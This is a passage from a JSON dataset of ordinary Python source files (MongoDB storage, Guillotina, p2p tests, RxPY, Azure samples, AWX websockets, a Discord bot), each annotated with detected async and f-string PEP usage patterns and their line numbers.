                    ],
                    [
                        22,
                        "    t_v1: Literal[\"Coroutine[Any, Any, AsyncGenerator[str, None]]\"] = reveal_type(v1)",
                        "type annotation"
                    ],
                    [
                        24,
                        "    t_gen: Literal[\"AsyncGenerator[str, None]\"] = reveal_type(gen)",
                        "type annotation"
                    ],
                    [
                        29,
                        "    t_v1: Literal[\"Coroutine[Any, Any, AsyncIterator[str]]\"] = reveal_type(v1)",
                        "type annotation"
                    ],
                    [
                        31,
                        "    t_gen: Literal[\"AsyncIterator[str]\"] = reveal_type(gen)",
                        "type annotation"
                    ]
                ],
                "pep_525": [
                    [
                        6,
                        9,
                        "async generator",
                        "async def generate(nums: List[int]) -> AsyncGenerator[str, None]:\n    for n in nums:\n        await asyncio.sleep(1)\n        yield f\"The number is {n}\""
                    ],
                    [
                        25,
                        26,
                        "async for",
                        "async for s in gen:\n        print(s)"
                    ],
                    [
                        32,
                        33,
                        "async for",
                        "async for s in gen:\n        print(s)"
                    ]
                ],
                "pep_498": [
                    [
                        9,
                        "        yield f\"The number is {n}\""
                    ]
                ]
            }
        },
        "112": {
            "file": "import asyncio\nfrom logger.log import storage\nfrom motor.motor_asyncio import AsyncIOMotorClient\nfrom bson import SON\nimport pprint\ntry:\n    import uvloop\n    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())\nexcept ImportError:\n    pass\ndb_configs = {\n    'type': 'mongo',\n    'host': '192.168.33.11',\n    'port': '27017',\n    'user': '',\n    'password': '',\n    'db_name': 'spider_data'\n}\nclass MotorBase(object):\n    def __init__(self):\n        self.__dict__.update(**db_configs)\n        if self.user:\n            self.motor_uri = f'mongodb://{self.user}:{self.password}@{self.host}:{self.port}/{self.db_name}?authSource={self.user}'\n        else:\n            self.motor_uri = f'mongodb://{self.host}:{self.port}/{self.db_name}'\n        self.client = AsyncIOMotorClient(self.motor_uri)\n        self.db = self.client.spider_data\n    async def save_data(self,item):\n        try:\n            await self.db.infoq_details.update_one(\n                {'uuid': item.get(\"uuid\")},\n                {'$set': item},\n                upsert=True)\n        except Exception as e:\n            storage.error(f'\u6570\u636e\u63d2\u5165\u51fa\u9519:{e.args},\u6b64\u65f6\u7684item\u662f{item}')\n    async def change_status(self,uuid,item,status_code=0):\n        try:\n            item['status'] = status_code\n            await self.db.infoq_seed.update_one({'uuid': uuid}, {'$set': item}, upsert=True)\n        except Exception as e:\n            if 'immutable' in e.args[0]:\n                await self.db.infoq_seed.delete_one({'_id':item['_id']})\n                storage.info(f'\u6570\u636e\u91cd\u590d\u5220\u9664:{e.args},\u6b64\u65f6\u7684\u6570\u636e\u662f:{item}')\n            else:\n                storage.error(f'\u4fee\u6539\u72b6\u6001\u51fa\u9519:{e.args},\u6b64\u65f6\u7684\u6570\u636e\u662f:{item}')\n    async def reset_status(self):\n        await self.db.infoq_seed.update_many({'status': 1},{'$set':{'status': 0}})\n    async def reset_all_status(self):\n        await self.db.infoq_seed.update_many({},{'$set': {\"status\": 0}})\n    async def get_detail_datas(self):\n        data = self.db.infoq_seed.find({'status': 1})\n        async for item in data:\n            print(item)\n        return data\n    async def use_count_command(self):\n        response = await self.db.command(SON([(\"count\", \"infoq_seed\")]))\n        print(f'response:{pprint.pformat(response)}')\nif __name__ == '__main__':\n    client = MotorBase()\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(client.get_detail_datas())",
            "patterns": {
                "pep_468": [
                    [
                        21,
                        "self.__dict__.update(**db_configs)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        52,
                        53,
                        "async for",
                        "async for item in data:\n            print(item)"
                    ]
                ],
                "pep_498": [
                    [
                        23,
                        "            self.motor_uri = f'mongodb://{self.user}:{self.password}@{self.host}:{self.port}/{self.db_name}?authSource={self.user}'"
                    ],
                    [
                        25,
                        "            self.motor_uri = f'mongodb://{self.host}:{self.port}/{self.db_name}'"
                    ],
                    [
                        57,
                        "        print(f'response:{pprint.pformat(response)}')"
                    ],
                    [
                        35,
                        "            storage.error(f'\u6570\u636e\u63d2\u5165\u51fa\u9519:{e.args},\u6b64\u65f6\u7684item\u662f{item}')"
                    ],
                    [
                        43,
                        "                storage.info(f'\u6570\u636e\u91cd\u590d\u5220\u9664:{e.args},\u6b64\u65f6\u7684\u6570\u636e\u662f:{item}')"
                    ],
                    [
                        45,
                        "                storage.error(f'\u4fee\u6539\u72b6\u6001\u51fa\u9519:{e.args},\u6b64\u65f6\u7684\u6570\u636e\u662f:{item}')"
                    ]
                ]
            }
        },
        "113": {
            "file": "from concurrent.futures import ThreadPoolExecutor\nfrom guillotina.auth.users import RootUser\nfrom guillotina.auth.validators import hash_password\nfrom guillotina.component import get_global_components\nfrom guillotina.component import get_utility\nfrom guillotina.component import provide_utility\nfrom guillotina.db import ROOT_ID\nfrom guillotina.interfaces import IApplication\nfrom guillotina.interfaces import IDatabase\nfrom guillotina.transactions import get_transaction\nfrom guillotina.utils import apply_coroutine\nfrom guillotina.utils import import_class\nfrom guillotina.utils import lazy_apply\nfrom zope.interface import implementer\nimport asyncio\nimport logging\nlogger = logging.getLogger('guillotina')\n@implementer(IApplication)\nclass ApplicationRoot(object):\n    executor = ThreadPoolExecutor(max_workers=100)\n    root_user = None\n    def __init__(self, config_file):\n        self._items = {}\n        self._config_file = config_file\n        self._async_utilities = {}\n    def add_async_utility(self, config, loop=None):\n        interface = import_class(config['provides'])\n        factory = import_class(config['factory'])\n        try:\n            utility_object = lazy_apply(factory, config.get('settings', {}), loop=loop)\n        except Exception:\n            logger.error('Error initializing utility {}'.format(repr(factory)),\n                         exc_info=True)\n            raise\n        provide_utility(utility_object, interface)\n        if hasattr(utility_object, 'initialize'):\n            task = asyncio.ensure_future(\n                lazy_apply(utility_object.initialize, app=self.app), loop=loop)\n        else:\n            task = None\n            logger.warn(f'No initialize method found on {utility_object} object')\n        self.add_async_task(config['provides'], task, config)\n    def add_async_task(self, ident, task, config):\n        if ident in self._async_utilities:\n            raise KeyError(\"Already exist an async utility with this id\")\n        self._async_utilities[ident] = {\n            'task': task,\n            'config': config\n        }\n    def cancel_async_utility(self, ident):\n        if ident in self._async_utilities:\n            if self._async_utilities[ident]['task'] is not None:\n                if not self._async_utilities[ident]['task'].done():\n                    self._async_utilities[ident]['task'].cancel()\n        else:\n            raise KeyError(\"Ident does not exist as utility\")\n    def del_async_utility(self, config):\n        self.cancel_async_utility(config['provides'])\n        interface = import_class(config['provides'])\n        utility = get_utility(interface)\n        gsm = get_global_components()\n        gsm.unregisterUtility(utility, provided=interface)\n        del self._async_utilities[config['provides']]\n    def set_root_user(self, user):\n        password = user['password']\n        if password:\n            password = hash_password(password)\n        self.root_user = RootUser(password)\n    def __contains__(self, key):\n        return True if key in self._items else False\n    def __len__(self):\n        return len(self._items)\n    def __getitem__(self, key):\n        return self._items[key]\n    async def get(self, key):\n        try:\n            return self[key]\n        except KeyError:\n            pass\n    def __delitem__(self, key):\n        del self._items[key]\n    def __iter__(self):\n        return iter(self._items.items())\n    def __setitem__(self, key, value):\n        self._items[key] = value\n    async def async_get(self, key):\n        return self._items[key]\n@implementer(IDatabase)\nclass Database(object):\n    def __init__(self, id, db):\n        self.id = id\n        self._db = db\n        self._conn = None\n    def get_transaction_manager(self):\n        return self._db.get_transaction_manager()\n    @property\n    def _p_jar(self):\n        try:\n            txn = get_transaction()\n            if txn is None:\n                txn = self.get_transaction_manager()._last_txn\n            return txn\n        except AttributeError:\n            return self.get_transaction_manager()._last_txn\n    async def get_root(self):\n        return await self._p_jar.get(ROOT_ID)\n    async def async_get(self, key, suppress_events=False):\n        root = await self.get_root()\n        return await root.async_get(key)\n    async def async_keys(self):\n        root = await self.get_root()\n        return await root._p_jar.keys(root._p_oid)\n    async def async_set(self, key, value):\n        root = await self.get_root()\n        await root.async_set(key, value)\n    async def async_del(self, key):\n        root = await self.get_root()\n        await apply_coroutine(root._p_jar.delete, await root.async_get(key))\n    async def async_items(self):\n        root = await self.get_root()\n        async for key, value in root._p_jar.items(root):\n            yield key, value\n    async def async_contains(self, key):\n        root = await self.get_root()\n        return await apply_coroutine(root._p_jar.contains, root._p_oid, key)\n    async def async_len(self):\n        root = await self.get_root()\n        return await apply_coroutine(root._p_jar.len, root._p_oid)",
            "patterns": {
                "pep_567": [
                    [
                        15,
                        15,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        119,
                        122,
                        "async generator",
                        "async def async_items(self):\n        root = await self.get_root()\n        async for key, value in root._p_jar.items(root):\n            yield key, value"
                    ],
                    [
                        121,
                        122,
                        "async for",
                        "async for key, value in root._p_jar.items(root):\n            yield key, value"
                    ]
                ],
                "pep_498v": [
                    [
                        32,
                        32,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        41,
                        "            logger.warn(f'No initialize method found on {utility_object} object')"
                    ]
                ]
            }
        },
        "114": {
            "file": "import asyncio\nimport pytest\nfrom p2p.disconnect import DisconnectReason\nfrom p2p.p2p_proto import Pong\nfrom p2p.p2p_api import P2PAPI\nfrom p2p.tools.factories import ConnectionPairFactory\n@pytest.fixture\nasync def alice_and_bob():\n    pair_factory = ConnectionPairFactory(\n        alice_client_version='alice',\n        bob_client_version='bob',\n    )\n    async with pair_factory as (alice, bob):\n        yield alice, bob\n@pytest.fixture\ndef alice(alice_and_bob):\n    alice, _ = alice_and_bob\n    return alice\n@pytest.fixture\ndef bob(alice_and_bob):\n    _, bob = alice_and_bob\n    return bob\n@pytest.mark.asyncio\nasync def test_p2p_api_properties(bob, alice):\n    async with P2PAPI().as_behavior().apply(alice):\n        assert alice.has_logic('p2p')\n        p2p_api = alice.get_logic('p2p', P2PAPI)\n        assert p2p_api.client_version_string == 'bob'\n        assert p2p_api.safe_client_version_string == 'bob'\n@pytest.mark.asyncio\nasync def test_p2p_api_pongs_when_pinged(bob, alice):\n    async with P2PAPI().as_behavior().apply(alice):\n        got_pong = asyncio.Event()\n        async def handle_pong(connection, msg):\n            got_pong.set()\n        bob.add_command_handler(Pong, handle_pong)\n        bob.get_base_protocol().send_ping()\n        await asyncio.wait_for(got_pong.wait(), timeout=1)\n@pytest.mark.asyncio\nasync def test_p2p_api_triggers_cancellation_on_disconnect(bob, alice):\n    async with P2PAPI().as_behavior().apply(alice):\n        p2p_api = alice.get_logic('p2p', P2PAPI)\n        bob.get_base_protocol().send_disconnect(DisconnectReason.client_quitting)\n        await asyncio.wait_for(alice.events.cancelled.wait(), timeout=1)\n        assert p2p_api.remote_disconnect_reason is DisconnectReason.client_quitting\n        assert p2p_api.local_disconnect_reason is None\n@pytest.mark.asyncio\nasync def test_p2p_api_disconnect_fn(bob, alice):\n    async with P2PAPI().as_behavior().apply(alice):\n        async with P2PAPI().as_behavior().apply(bob):\n            alice_p2p_api = alice.get_logic('p2p', P2PAPI)\n            bob_p2p_api = bob.get_logic('p2p', P2PAPI)\n            await alice_p2p_api.disconnect(DisconnectReason.client_quitting)\n            await asyncio.wait_for(bob.events.cancelled.wait(), timeout=1)\n            assert alice_p2p_api.remote_disconnect_reason is None\n            assert alice_p2p_api.local_disconnect_reason is DisconnectReason.client_quitting\n            assert bob_p2p_api.remote_disconnect_reason is DisconnectReason.client_quitting\n            assert bob_p2p_api.local_disconnect_reason is None\n@pytest.mark.asyncio\nasync def test_p2p_api_disconnect_fn_nowait(bob, alice):\n    async with P2PAPI().as_behavior().apply(alice):\n        async with P2PAPI().as_behavior().apply(bob):\n            alice_p2p_api = alice.get_logic('p2p', P2PAPI)\n            bob_p2p_api = bob.get_logic('p2p', P2PAPI)\n            alice_p2p_api.disconnect_nowait(DisconnectReason.client_quitting)\n            await asyncio.wait_for(bob.events.cancelled.wait(), timeout=1)\n            assert alice_p2p_api.remote_disconnect_reason is None\n            assert alice_p2p_api.local_disconnect_reason is DisconnectReason.client_quitting\n            assert bob_p2p_api.remote_disconnect_reason is DisconnectReason.client_quitting\n            assert bob_p2p_api.local_disconnect_reason is None",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        8,
                        14,
                        "async generator",
                        "async def alice_and_bob():\n    pair_factory = ConnectionPairFactory(\n        alice_client_version='alice',\n        bob_client_version='bob',\n    )\n    async with pair_factory as (alice, bob):\n        yield alice, bob"
                    ]
                ]
            }
        },
        "115": {
            "file": "import asyncio\nfrom asyncio import Future\nimport rx3\nfrom rx3 import operators as ops\nfrom rx3 import Observable\nfrom rx3.scheduler.eventloop import AsyncIOScheduler\ndef to_async_iterable():\n    def _to_async_iterable(source: Observable):\n        class AIterable:\n            def __aiter__(self):\n                class AIterator:\n                    def __init__(self):\n                        self.notifications = []\n                        self.future = Future()\n                        source.pipe(ops.materialize()).subscribe(self.on_next)\n                    def feeder(self):\n                        if not self.notifications or self.future.done():\n                            return\n                        notification = self.notifications.pop(0)\n                        dispatch = {\n                            'N': lambda: self.future.set_result(notification.value),\n                            'E': lambda: self.future.set_exception(notification.exception),\n                            'C': lambda: self.future.set_exception(StopAsyncIteration)\n                        }\n                        dispatch[notification.kind]()\n                    def on_next(self, notification):\n                        self.notifications.append(notification)\n                        self.feeder()\n                    async def __anext__(self):\n                        self.feeder()\n                        value = await self.future\n                        self.future = Future()\n                        return value\n                return AIterator()\n        return AIterable()\n    return _to_async_iterable\nasync def go(loop):\n    scheduler = AsyncIOScheduler(loop)\n    ai = rx.range(0, 10, scheduler=scheduler).pipe(to_async_iterable())\n    async for x in ai:\n        print(\"got %s\" % x)\ndef main():\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(go(loop))\nif __name__ == '__main__':\n    main()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ],
                    [
                        2,
                        2,
                        "import",
                        "from asyncio import Future"
                    ]
                ],
                "pep_525": [
                    [
                        40,
                        41,
                        "async for",
                        "async for x in ai:\n        print(\"got %s\" % x)"
                    ]
                ],
                "pep_498v": [
                    [
                        41,
                        41,
                        "%"
                    ]
                ]
            }
        },
        "116": {
            "file": "import asyncio\nasync def sample_recognize_custom_entities_async() -> None:\n    import os\n    from azure.core.credentials import AzureKeyCredential\n    from azure.ai.textanalytics.aio import TextAnalyticsClient\n    endpoint = os.environ[\"AZURE_LANGUAGE_ENDPOINT\"]\n    key = os.environ[\"AZURE_LANGUAGE_KEY\"]\n    project_name = os.environ[\"CUSTOM_ENTITIES_PROJECT_NAME\"]\n    deployment_name = os.environ[\"CUSTOM_ENTITIES_DEPLOYMENT_NAME\"]\n    path_to_sample_document = os.path.abspath(\n        os.path.join(\n            os.path.abspath(__file__),\n            \"..\",\n            \"..\",\n            \"./text_samples/custom_entities_sample.txt\",\n        )\n    )\n    text_analytics_client = TextAnalyticsClient(\n        endpoint=endpoint,\n        credential=AzureKeyCredential(key),\n    )\n    with open(path_to_sample_document) as fd:\n        document = [fd.read()]\n    async with text_analytics_client:\n        poller = await text_analytics_client.begin_recognize_custom_entities(\n            document,\n            project_name=project_name,\n            deployment_name=deployment_name\n        )\n        document_results = await poller.result()\n        async for custom_entities_result in document_results:\n            if custom_entities_result.kind == \"CustomEntityRecognition\":\n                for entity in custom_entities_result.entities:\n                    print(\n                        \"Entity '{}' has category '{}' with confidence score of '{}'\".format(\n                            entity.text, entity.category, entity.confidence_score\n                        )\n                    )\n            elif custom_entities_result.is_error is True:\n                print(\"...Is an error with code '{}' and message '{}'\".format(\n                    custom_entities_result.error.code, custom_entities_result.error.message\n                    )\n                )\nasync def main():\n    await sample_recognize_custom_entities_async()\nif __name__ == '__main__':\n    asyncio.run(main())",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        31,
                        43,
                        "async for",
                        "async for custom_entities_result in document_results:\n            if custom_entities_result.kind == \"CustomEntityRecognition\":\n                for entity in custom_entities_result.entities:\n                    print(\n                        \"Entity '{}' has category '{}' with confidence score of '{}'\".format(\n                            entity.text, entity.category, entity.confidence_score\n                        )\n                    )\n            elif custom_entities_result.is_error is True:\n                print(\"...Is an error with code '{}' and message '{}'\".format(\n                    custom_entities_result.error.code, custom_entities_result.error.message\n                    )\n                )"
                    ]
                ],
                "pep_498v": [
                    [
                        35,
                        37,
                        ".format()"
                    ],
                    [
                        40,
                        42,
                        ".format()"
                    ]
                ]
            }
        },
        "117": {
            "file": "import json\nimport logging\nimport asyncio\nimport aiohttp\nfrom aiohttp import client_exceptions\nfrom channels.layers import get_channel_layer\nfrom django.conf import settings\nfrom django.apps import apps\nfrom django.core.serializers.json import DjangoJSONEncoder\nfrom awx.main.analytics.broadcast_websocket import (\n    BroadcastWebsocketStats,\n    BroadcastWebsocketStatsManager,\n)\nimport awx.main.analytics.subsystem_metrics as s_metrics\nlogger = logging.getLogger('awx.main.wsbroadcast')\ndef wrap_broadcast_msg(group, message: str):\n    return json.dumps(dict(group=group, message=message), cls=DjangoJSONEncoder)\ndef unwrap_broadcast_msg(payload: dict):\n    return (payload['group'], payload['message'])\ndef get_broadcast_hosts():\n    Instance = apps.get_model('main', 'Instance')\n    instances = (\n        Instance.objects.exclude(hostname=Instance.objects.me().hostname)\n        .exclude(node_type='execution')\n        .order_by('hostname')\n        .values('hostname', 'ip_address')\n        .distinct()\n    )\n    return {i['hostname']: i['ip_address'] or i['hostname'] for i in instances}\ndef get_local_host():\n    Instance = apps.get_model('main', 'Instance')\n    return Instance.objects.me().hostname\nclass WebsocketTask:\n    def __init__(\n        self,\n        name,\n        event_loop,\n        stats: BroadcastWebsocketStats,\n        remote_host: str,\n        remote_port: int = settings.BROADCAST_WEBSOCKET_PORT,\n        protocol: str = settings.BROADCAST_WEBSOCKET_PROTOCOL,\n        verify_ssl: bool = settings.BROADCAST_WEBSOCKET_VERIFY_CERT,\n        endpoint: str = 'broadcast',\n    ):\n        self.name = name\n        self.event_loop = event_loop\n        self.stats = stats\n        self.remote_host = remote_host\n        self.remote_port = remote_port\n        self.endpoint = endpoint\n        self.protocol = protocol\n        self.verify_ssl = verify_ssl\n        self.channel_layer = None\n        self.subsystem_metrics = s_metrics.Metrics()\n    async def run_loop(self, websocket: aiohttp.ClientWebSocketResponse):\n        raise RuntimeError(\"Implement me\")\n    async def connect(self, attempt):\n        from awx.main.consumers import WebsocketSecretAuthHelper  \n        logger.debug(f\"Connection from {self.name} to {self.remote_host} attempt number {attempt}.\")\n        if not self.channel_layer:\n            self.channel_layer = get_channel_layer()\n        try:\n            if attempt > 0:\n                await asyncio.sleep(settings.BROADCAST_WEBSOCKET_RECONNECT_RETRY_RATE_SECONDS)\n        except asyncio.CancelledError:\n            logger.warn(f\"Connection from {self.name} to {self.remote_host} cancelled\")\n            raise\n        uri = f\"{self.protocol}://{self.remote_host}:{self.remote_port}/websocket/{self.endpoint}/\"\n        timeout = aiohttp.ClientTimeout(total=10)\n        secret_val = WebsocketSecretAuthHelper.construct_secret()\n        try:\n            async with aiohttp.ClientSession(headers={'secret': secret_val}, timeout=timeout) as session:\n                async with session.ws_connect(uri, ssl=self.verify_ssl, heartbeat=20) as websocket:\n                    logger.info(f\"Connection from {self.name} to {self.remote_host} established.\")\n                    self.stats.record_connection_established()\n                    attempt = 0\n                    await self.run_loop(websocket)\n        except asyncio.CancelledError:\n            logger.warn(f\"Connection from {self.name} to {self.remote_host} cancelled.\")\n            self.stats.record_connection_lost()\n            raise\n        except client_exceptions.ClientConnectorError as e:\n            logger.warn(f\"Connection from {self.name} to {self.remote_host} failed: '{e}'.\")\n        except asyncio.TimeoutError:\n            logger.warn(f\"Connection from {self.name} to {self.remote_host} timed out.\")\n        except Exception as e:\n            logger.warn(f\"Connection from {self.name} to {self.remote_host} failed for unknown reason: '{e}'.\")\n        else:\n            logger.warn(f\"Connection from {self.name} to {self.remote_host} list.\")\n        self.stats.record_connection_lost()\n        self.start(attempt=attempt + 1)\n    def start(self, attempt=0):\n        self.async_task = self.event_loop.create_task(self.connect(attempt=attempt))\n    def cancel(self):\n        self.async_task.cancel()\nclass BroadcastWebsocketTask(WebsocketTask):\n    async def run_loop(self, websocket: aiohttp.ClientWebSocketResponse):\n        async for msg in websocket:\n            self.stats.record_message_received()\n            if msg.type == aiohttp.WSMsgType.ERROR:\n                break\n            elif msg.type == aiohttp.WSMsgType.TEXT:\n                try:\n                    payload = json.loads(msg.data)\n                except json.JSONDecodeError:\n                    logmsg = \"Failed to decode broadcast message\"\n                    if logger.isEnabledFor(logging.DEBUG):\n                        logmsg = \"{} {}\".format(logmsg, payload)\n                    logger.warn(logmsg)\n                    continue\n                (group, message) = unwrap_broadcast_msg(payload)\n                if group == \"metrics\":\n                    self.subsystem_metrics.store_metrics(message)\n                    continue\n                await self.channel_layer.group_send(group, {\"type\": \"internal.message\", \"text\": message})\nclass BroadcastWebsocketManager(object):\n    def __init__(self):\n        self.event_loop = asyncio.get_event_loop()\n        self.broadcast_tasks = dict()\n        self.local_hostname = get_local_host()\n        self.stats_mgr = BroadcastWebsocketStatsManager(self.event_loop, self.local_hostname)\n    async def run_per_host_websocket(self):\n        while True:\n            known_hosts = get_broadcast_hosts()\n            future_remote_hosts = known_hosts.keys()\n            current_remote_hosts = self.broadcast_tasks.keys()\n            deleted_remote_hosts = set(current_remote_hosts) - set(future_remote_hosts)\n            new_remote_hosts = set(future_remote_hosts) - set(current_remote_hosts)\n            remote_addresses = {k: v.remote_host for k, v in self.broadcast_tasks.items()}\n            for hostname, address in known_hosts.items():\n                if hostname in self.broadcast_tasks and address != remote_addresses[hostname]:\n                    deleted_remote_hosts.add(hostname)\n                    new_remote_hosts.add(hostname)\n            if deleted_remote_hosts:\n                logger.warn(f\"Removing {deleted_remote_hosts} from websocket broadcast list\")\n            if new_remote_hosts:\n                logger.warn(f\"Adding {new_remote_hosts} to websocket broadcast list\")\n            for h in deleted_remote_hosts:\n                self.broadcast_tasks[h].cancel()\n                del self.broadcast_tasks[h]\n                self.stats_mgr.delete_remote_host_stats(h)\n            for h in new_remote_hosts:\n                stats = self.stats_mgr.new_remote_host_stats(h)\n                broadcast_task = BroadcastWebsocketTask(name=self.local_hostname, event_loop=self.event_loop, stats=stats, remote_host=known_hosts[h])\n                broadcast_task.start()\n                self.broadcast_tasks[h] = broadcast_task\n            await asyncio.sleep(settings.BROADCAST_WEBSOCKET_NEW_INSTANCE_POLL_RATE_SECONDS)\n    def start(self):\n        self.stats_mgr.start()\n        self.async_task = self.event_loop.create_task(self.run_per_host_websocket())\n        return self.async_task",
            "patterns": {
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        98,
                        115,
                        "async for",
                        "async for msg in websocket:\n            self.stats.record_message_received()\n            if msg.type == aiohttp.WSMsgType.ERROR:\n                break\n            elif msg.type == aiohttp.WSMsgType.TEXT:\n                try:\n                    payload = json.loads(msg.data)\n                except json.JSONDecodeError:\n                    logmsg = \"Failed to decode broadcast message\"\n                    if logger.isEnabledFor(logging.DEBUG):\n                        logmsg = \"{} {}\".format(logmsg, payload)\n                    logger.warn(logmsg)\n                    continue\n                (group, message) = unwrap_broadcast_msg(payload)\n                if group == \"metrics\":\n                    self.subsystem_metrics.store_metrics(message)\n                    continue\n                await self.channel_layer.group_send(group, {\"type\": \"internal.message\", \"text\": message})"
                    ]
                ],
                "pep_498v": [
                    [
                        108,
                        108,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        68,
                        "        uri = f\"{self.protocol}://{self.remote_host}:{self.remote_port}/websocket/{self.endpoint}/\""
                    ],
                    [
                        59,
                        "        logger.debug(f\"Connection from {self.name} to {self.remote_host} attempt number {attempt}.\")"
                    ],
                    [
                        89,
                        "            logger.warn(f\"Connection from {self.name} to {self.remote_host} list.\")"
                    ],
                    [
                        66,
                        "            logger.warn(f\"Connection from {self.name} to {self.remote_host} cancelled\")"
                    ],
                    [
                        79,
                        "            logger.warn(f\"Connection from {self.name} to {self.remote_host} cancelled.\")"
                    ],
                    [
                        83,
                        "            logger.warn(f\"Connection from {self.name} to {self.remote_host} failed: '{e}'.\")"
                    ],
                    [
                        85,
                        "            logger.warn(f\"Connection from {self.name} to {self.remote_host} timed out.\")"
                    ],
                    [
                        87,
                        "            logger.warn(f\"Connection from {self.name} to {self.remote_host} failed for unknown reason: '{e}'.\")"
                    ],
                    [
                        135,
                        "                logger.warn(f\"Removing {deleted_remote_hosts} from websocket broadcast list\")"
                    ],
                    [
                        137,
                        "                logger.warn(f\"Adding {new_remote_hosts} to websocket broadcast list\")"
                    ],
                    [
                        74,
                        "                    logger.info(f\"Connection from {self.name} to {self.remote_host} established.\")"
                    ]
                ]
            }
        },
        "118": {
            "file": "import os\nimport discord\nimport requests\nimport json\nimport random\nimport asyncio\nTOKEN = os.getenv('DISCORD_TOKEN')\nGUILD = os.getenv('GUILD_NAME')\nsad_words = [\n    \"Unhappy\",\n    \"Sad\",\n    \"Blue\"\n]\nstarter_encouragements  = [\n    \"Don't be sad!\", \n    \"It's okay!\"\n]\nclient = discord.Client()\ndef get_quote():\n    response = requests.get(\"https://zenquotes.io/api/random\")\n    json_response = json.loads(response.text) \n    quote = ' Quote: ' + json_response[0]['q'] + ' - ' + json_response[0]['a']\n    return quote\ndef greet_user(name):\n    greeting = \"Oh, hi there \" + name + \"!\"\n    return greeting\ndef update_commands(command):\n    if \"commands\" in db.keys():\n        commands = db[\"commands\"]\n        commands.append(command)\n        db[\"commands\"] = commands\n    else:\n        db[\"commands\"] = [\"commands\"]\ndef delete_commands(index):\n    commands = db[\"commands\"]\n    if len(commands) > index:\n        del commands[index]\n    commands = db[\"commands\"]\n@client.event \nasync def on_ready():\n    print(f\"{client.user} has logged in!\")\n@client.event\nasync def on_message(message):\n    msg = message.content\n    if message.author == client.user:\n        return\n    elif msg.startswith(\"/\"):\n        commands = {\n                \"/greet\":\"Greet user by name.\",\n                \"/delete\":\"Delete all messages in current channel.\",\n                \"$inspire\":\"See an inspirational quote.\" \n            }\n        options = commands\n        if \"commands\" in db.keys():\n            options = options + db[\"commands\"]\n        if any(command in msg for command in commands):\n            await message.channel.send(random.choice(options))\n        if msg.startswith(\"/new\"):\n            new_command = msg.split(\"/new \", 1)[1]\n            update_commands(new_command)\n            await message.channel.send(\"New command was created!\")\n        if msg == \"/greet\":\n            name = message.author.name\n            greeting = greet_user(name)\n            await message.channel.send(greeting)\n        elif msg == \"/list\":           \n            for command, description in commands.items():\n                await message.channel.send(f\"Command: {command}\" + \"\\n\" f\"Description: {description}\")\n        elif msg == \"/delete\":\n            await message.channel.send(\"Clearing messages. Wait just a sec.\")\n            await asyncio.sleep(5) \n            messages = message.channel.history(limit=10000)\n            async for msg in messages:\n                await msg.delete()\n        elif msg == \"/inspire\":\n            quote = get_quote()\nclient.run(TOKEN)",
            "patterns": {
                "pep_567": [
                    [
                        6,
                        6,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        73,
                        74,
                        "async for",
                        "async for msg in messages:\n                await msg.delete()"
                    ]
                ],
                "pep_498": [
                    [
                        41,
                        "    print(f\"{client.user} has logged in!\")"
                    ],
                    [
                        68,
                        "                await message.channel.send(f\"Command: {command}\" + \"\\n\" f\"Description: {description}\")"
                    ],
                    [
                        68,
                        "                await message.channel.send(f\"Command: {command}\" + \"\\n\" f\"Description: {description}\")"
                    ]
                ]
            }
        },
        "119": {
            "file": "from __future__ import annotations\nimport asyncio\nimport itertools\nimport math\nimport re\nfrom collections import deque\nfrom collections.abc import Callable, Coroutine\nfrom datetime import datetime, timezone\nfrom typing import TYPE_CHECKING, Any, Generic, TypeVar\nfrom bs4 import BeautifulSoup\nfrom typing_extensions import ClassVar, TypeAlias\nfrom . import utils\nfrom .comment import Comment\nfrom .enums import TradeOfferState\nif TYPE_CHECKING:\n    from .abc import Channel, Commentable, Message\n    from .channel import ClanChannel, ClanMessage, DMChannel, GroupChannel, GroupMessage, UserMessage\n    from .clan import Clan\n    from .event import Announcement, Event\n    from .game import StatefulGame\n    from .state import ConnectionState\n    from .trade import DescriptionDict, TradeOffer\nT = TypeVar(\"T\")\nTT = TypeVar(\"TT\")\nChannelT = TypeVar(\"ChannelT\", bound=\"Channel[Any]\")\nCommentableT = TypeVar(\"CommentableT\", bound=\"Commentable\")\nM = TypeVar(\"M\", bound=\"Message\")\nMaybeCoro: TypeAlias = \"Callable[[T], bool | Coroutine[Any, Any, bool]]\"\nUNIX_EPOCH = datetime.fromtimestamp(0, tz=timezone.utc)\nclass AsyncIterator(Generic[T]):  \n    def __init__(self, state: ConnectionState, limit: int | None, before: datetime | None, after: datetime | None):\n        self._state = state\n        self.before = before or datetime.now(tz=timezone.utc)\n        self.after = after or UNIX_EPOCH\n        self._is_filled = False\n        self.queue: deque[T] = deque()\n        self.limit = limit\n    def _append(self, element: T) -> bool:\n        if self.limit is None:\n            self.queue.append(element)\n            return True\n        if len(self.queue) < self.limit:\n            self.queue.append(element)\n            return True\n        if len(self.queue) == self.limit:\n            self.queue.append(element)\n        return False\n    async def _fill_queue_users(\n        self,\n        id64s: set[Any],  \n        attributes: tuple[str, ...] = (\"author\",),\n    ) -> None:\n        for user, element in itertools.product(await self._state.fetch_users(list(id64s)), self.queue):\n            for attribute in attributes:\n                if getattr(element, attribute, None) == user:\n                    setattr(element, attribute, user)\n    async def get(self, **attrs: Any) -> T | None:\n        def predicate(elem: T) -> bool:\n            for attr, val in attrs.items():\n                nested = attr.split(\"__\")\n                obj = elem\n                for attribute in nested:\n                    obj = getattr(obj, attribute)\n                if obj != val:\n                    return False\n            return True\n        return await self.find(predicate)\n    async def find(self, predicate: MaybeCoro[T]) -> T | None:\n        async for elem in self:\n            ret = await 